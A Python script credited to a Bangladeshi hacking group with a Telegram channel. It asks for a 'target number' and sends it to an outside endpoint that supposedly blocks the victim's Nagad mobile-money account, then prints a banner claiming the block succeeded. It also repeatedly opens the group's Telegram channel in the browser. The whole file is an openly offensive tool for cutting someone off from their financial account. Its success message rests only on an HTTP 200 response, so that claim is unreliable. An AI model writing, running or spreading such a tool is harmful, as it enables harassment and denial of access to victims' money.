#!/usr/bin/python3
# Coded By - CYBER X OF BANGLADESH™
# Telegram - https://t.me/CYBER_X_OF_BANGLADESH

import os
import requests
import webbrowser
from fake_useragent import UserAgent
import time

user_agent = UserAgent()

# Updated Colorful Floating ASCII Art
ascii_art = """
\033[38;5;45m╔════════════════════════════════════════════════════════════════════════╗\033[0m
\033[38;5;51m║                                                                        ║\033[0m
\033[38;5;33m║  
   ______  ____  ____   ___   ________  ______     
 .' ___  ||_  _||_  _|.'   `.|_   __  ||_   _ \    
/ .'   \_|  \ \  / / /  .-.  \ | |_ \_|  | |_) |   
| |          > `' <  | |   | | |  _|     |  __'.   
\ `.___.'\ _/ /'`\ \_\  `-'  /_| |_     _| |__) |  
 `.____ .'|____||____|`.___.'|_____|   |_______/   
                                                   

\033[38;5;51m║      Credit: CYBER X OF BANGLADESH | Telegram: https://t.me/CYBER_X_OF_BANGLADESH        ║\033[0m
\033[38;5;45m╚════════════════════════════════════════════════════════════════════════╝\033[0m
"""

class BlockTool:
    @staticmethod
    def start():
        os.system("clear")
        print(ascii_art)
        print("\033[33m🔄 Redirecting to our Telegram Channel...\033[0m")
        time.sleep(2)  # Adding a small delay before redirecting to the channel
        webbrowser.open('https://t.me/CYBER_X_OF_BANGLADESH')  # This will open the channel link in the browser
        BlockTool.get_target_number()

    @staticmethod
    def get_target_number():
        os.system("clear")
        print(ascii_art)
        phone_number = input("\033[33m📞 Enter Your Target Number: \033[0m")
        print("\033[36m" + 45 * '═' + "\033[0m")
        try:
            if phone_number.isdigit():
                print(f"\033[32mYou entered: {phone_number}\033[0m")
            else:
                print("\033[31m❌ Invalid phone number!\033[0m")
                return
        except ValueError:
            print("\033[31m❌ Please enter a valid number.\033[0m")
            return
        BlockTool.block_number(phone_number)

    @staticmethod
    def block_number(phone_number):
        try:
            # Use the actual Nagad block API URL here
            apiUrl = f"https://jhenaigati-adss.com/block.php?number={phone_number}"

            # Make the request to the API
            response = requests.get(apiUrl)

            # Check the response
            if response.status_code == 200:
                print(f"\033[32m✅ Block request sent for {phone_number}\033[0m")
                BlockTool.show_success_notice(phone_number)
            else:
                print(f"\033[31m❌ Failed to block the number: {phone_number}\033[0m")
        except Exception as error:
            print(f"\033[31m⚠️ Request Error: {error}\033[0m")
        
        print("\033[36m" + 45 * '═' + "\033[0m")
        input("\033[33m🔙 Press Enter to Go Back or visit our Telegram Channel: https://t.me/tech_arafat_09\033[0m")
        os.system("clear")
        webbrowser.open('https://t.me/CYBER_X_OF_BANGLADESH')  # Open the channel link again
        BlockTool.start()

    @staticmethod
    def show_success_notice(phone_number):
        print("\033[32m")
        print("╔════════════════════════════════════════════════════════════════════════╗")
        print("║                                                                        ║")
        print(f"║   \033[1m📢 Success! Your Nagad number {phone_number} has been successfully blocked \033[0m")
        print(f"║   \033[1m      for a temporary period. Your request has been processed.\033[0m")
        print("║                                                                        ║")
        print("╚════════════════════════════════════════════════════════════════════════╝")
        print("\033[0m")

BlockTool.start()